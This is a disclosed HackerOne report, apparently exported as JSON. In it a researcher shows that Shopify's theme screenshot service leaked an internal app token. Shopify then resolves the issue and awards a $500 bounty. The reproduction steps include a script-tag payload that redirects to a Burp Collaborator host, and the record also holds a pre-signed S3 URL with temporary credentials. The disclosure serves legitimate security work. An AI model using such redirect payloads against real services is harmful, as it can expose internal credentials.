{"id":1067443,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMDY3NDQz","url":"https://hackerone.com/reports/1067443","title":"Screenshot Service leaks X-ABS-App-Token","state":"Closed","substate":"resolved","severity_rating":"none","readable_substate":"Resolved","created_at":"2020-12-28T13:13:15.568Z","submitted_at":"2020-12-28T13:13:15.641Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"corraldev","url":"/corraldev","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/3ySYefuautqE2gvEH43ZvNsb/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":1382,"url":"https://hackerone.com/shopify","handle":"shopify","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"Shopify","twitter_handle":"","website":"https://www.shopify.com","about":"Shopify is a multi-channel commerce platform that helps people sell online, in-store, and everywhere in between."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2021-02-12T12:44:23.524Z","bug_reporter_agreed_on_going_public_at":"2021-02-12T12:44:23.461Z","team_member_agreed_on_going_public_at":"2021-02-11T19:34:20.059Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"1. Login and create a development store\n2. Start Burp Suite and open a burp collaborator client then copy the collaborator payload\n3. Edit the section header.liquid of your current theme. Adding this:\n\n````\n\u003cscript\u003e\n  window.location=\"https://[paste_here_collaborator]/\";\n\u003c/script\u003e\n\n````\nFinally go to https://your-store.myshopify.com/admin/themes , in your collaborator client you should be able to read the server request\n\n## Impact\n\nThis SSRF expose `X-ABS-App-Token: screenshot-service-production@████████` . \nFortunately when you load another location than the preview page of your shop the screenshot isn't taken but can open the door to another vulnerabilities.","bounty_amount":"500.0","formatted_bounty":"$500","weakness":{"id":68,"name":"Server-Side Request Forgery (SSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":12,"voters":["yssk","drsniper","corraldev","ali","ms-13","powerjacobb1","h4x0r_dz","akashhamal0x01","securitythinker","shajuafridi","and 2 more..."],"severity":{"rating":"none","score":0.0,"author_type":"Team","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"none","scope":"unchanged","confidentiality":"none","integrity":"none","availability":"none"}},"structured_scope":{"databaseId":10803,"asset_type":"OTHER","asset_identifier":"Other","max_severity":"none"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":10218259,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for reporting this bug! This is an automated response to let you know that we've received your issue, and we'll process it as soon as possible.\n\nDue to the holiday period, it may take up to three weeks for us to respond. Thank you for your patience!","automated_response":true,"created_at":"2020-12-28T13:13:15.950Z","updated_at":"2020-12-28T13:13:15.950Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10218267,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here is the request I've received:\n{F1132515}\n████","automated_response":false,"created_at":"2020-12-28T13:15:15.794Z","updated_at":"2021-02-11T19:33:57.517Z","actor":{"username":"corraldev","cleared":false,"url":"/corraldev","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/3ySYefuautqE2gvEH43ZvNsb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":1132515,"filename":"Captura_de_pantalla_2020-12-28_a_las_14.13.56.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/f44yuimk06aniz3b9k61ja9kpvne?response-content-disposition=attachment%3B%20filename%3D%22Captura_de_pantalla_2020-12-28_a_las_14.13.56.png%22%3B%20filename%2A%3DUTF-8%27%27Captura_de_pantalla_2020-12-28_a_las_14.13.56.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQVIDF5ZMX%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T132135Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHUaCXVzLXdlc3QtMiJIMEYCIQDQQQUuKj8T5pdoqR2Krp3zajoi1gg54vXvD2Ne1FwhmAIhAKKfb3UfAQbrUu4HHC%2B4UyMY7m5fBTHvtLlTV0hUevF7KoMECO7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEQAhoMMDEzNjE5Mjc0ODQ5Igy%2F64SgTlh6KUEnD5Uq1wMsL4Z6ljP60c3R7lO1zjypi9biR2g5iQoP%2FT3s6lOKdbpGuE3RHjMeja9YKKN7goc11u6bYdonocyi6RU8RN2An2aRnhfVo3l%2FZlMwpffUbu5JHc7OKmtZqUXTysPRszIl1CCSQ50yZBwtNWg%2Fxavv6bNKeHjCjYNwQxGBqC%2ByBW24czUMzGzaD5uFMoYGAMoWIxFJ6iHFG8UfXfoB1shKsZ3jkdkCp2MI12RtkuUec%2F0QW%2BSUqdLWUg2p3%2B1H%2FJaoFmNN5Utibk4elkj5kRmoejx7EnpbtxcHN1J6Ccb1mMlapHFqvmkcjE8fLu3vLMoRZX0qMhHcbtwHM4mmdbMGDcLaK4ZzuGUfKK3tlGfzyb%2BJEOYnCFd1OBdp9DB9bhiSMWyc1JifbNweT%2F1X1i3QMSQ%2BviuXf%2Bxvep9dRJ8nErGx9JdRp3yS8jCqdzkSh9FhreaRloo4jHkFXz72rd1zbbphih0VnX1T1kREihWx9RKRGpfOf2ct6w59fDThEMiXM7%2B1ZWMP1qPO2XDz8hAqeQqURPDe5AmiGn%2FZKFThe%2F8xzj0%2B5M2W36t3rKudZmsfzk9t0V0gZgIgIqXzHYE871rDImxmRy6q2HeWGIt10F1JC%2Fc9vpEwvO6QiwY6pAFAIHM092pG3M%2B23%2BPi00SqMMlTN%2FebpZH7d1Rq7%2BpDNNT62MHysMiTIJwmN0mj3cgRIiDLQKqFPlp97hcSQcDzJF%2F5WJ%2FSpWbDFtqVjRTP9eZ3KoMBEOEbvq2IGUFF14lCJNIXEj03clafpnnHjjr5akYILvb51xnKlHai4iTUO00TgVrv5%2FXDjYcFV06nU8YCB3mUWnDHCpTI6c%2BltGO9Yt9pxQ%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=647ce502254939373c6c31df5352c11ef64126cc9d766b09e5ad4f7247f4a108"}],"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10287014,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @corraldev,\n\nThank you for the report. While what you have described does not constitute a server side request forgery (your Burp collaborator server is public, and SSRF requires access to an internal resource) the exposure of the X-ABS-App-Token header was nonetheless unintended. We have deployed a fix that should prevent this token from being exposed. For this reason, we will close this report as Resolved. We will get back to you regarding a bounty decision within the next week. Thanks for hacking on Shopify, and we look forward to your next report!\n\nHappy hacking,\n\nJack","automated_response":false,"created_at":"2021-01-06T16:38:19.051Z","updated_at":"2021-01-06T16:38:19.051Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"corraldev","url":"/corraldev"},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10308683,"is_internal":false,"editable":false,"type":"Activities::ReportTitleUpdated","message":"","automated_response":false,"created_at":"2021-01-08T16:17:45.228Z","updated_at":"2021-01-08T16:17:45.228Z","additional_data":{"old_title":"SSRF via actual theme preview","new_title":"Screenshot Service leaks X-ABS-App-Token"},"actor":{"username":"clayton","cleared":false,"url":"/clayton","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/YKjJrQvn996bd2n67ELXwtHt/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10308769,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @corraldev, and thanks again for your report!\n\nAfter having a closer look into this issue, we determined that disclosure of the `X-ABS-App-Token` does not have any Confidentiality, Integrity, or Availability impact for Shopify merchants, buyers, or partners. As a result, the CVSS score for this issue is 0.0. Nonetheless, we did not intend for this token to be publicly accessible, so we've decided to award a $500 bounty for this report.\n\nWe look forward to hearing from you again soon. Happy hacking!","automated_response":false,"created_at":"2021-01-08T16:28:34.128Z","updated_at":"2021-01-08T16:28:34.128Z","actor":{"url":"/shopify","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/fjjiC5585s8WoDGHv2M5okbJ/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"Shopify"}},"bounty_amount":"0.0","bounty_currency":"usd","bonus_amount":"500.0","genius_execution_id":null,"team_handle":"shopify","collaborator":{"username":"corraldev","url":"/corraldev"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10478158,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":null,"automated_response":false,"created_at":"2021-01-25T23:50:35.507Z","updated_at":"2021-01-25T23:50:35.507Z","additional_data":{"old_severity":"High","new_severity":"None (0.0)","old_severity_id":943436,"new_severity_id":967131},"actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10478180,"is_internal":false,"editable":false,"type":"Activities::ChangedScope","message":"","automated_response":false,"created_at":"2021-01-25T23:56:37.674Z","updated_at":"2021-01-25T23:56:37.674Z","actor":{"username":"jack_mccracken","cleared":false,"url":"/jack_mccracken","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/164/342/6543dc397b4dbb2c24dc81f92a42de654a3e6a99_original.jpeg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"old_scope":"your-store.myshopify.com","new_scope":"Other","genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10649425,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-02-11T19:34:20.081Z","updated_at":"2021-02-11T19:34:20.081Z","first_to_agree":true,"actor":{"username":"jenn-shopify","cleared":false,"url":"/jenn-shopify","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10655008,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2021-02-12T12:44:23.488Z","updated_at":"2021-02-12T12:44:23.488Z","actor":{"username":"corraldev","cleared":false,"url":"/corraldev","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/3ySYefuautqE2gvEH43ZvNsb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10655009,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2021-02-12T12:44:23.559Z","updated_at":"2021-02-12T12:44:23.559Z","actor":{"username":"corraldev","cleared":false,"url":"/corraldev","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/3ySYefuautqE2gvEH43ZvNsb/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"shopify","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}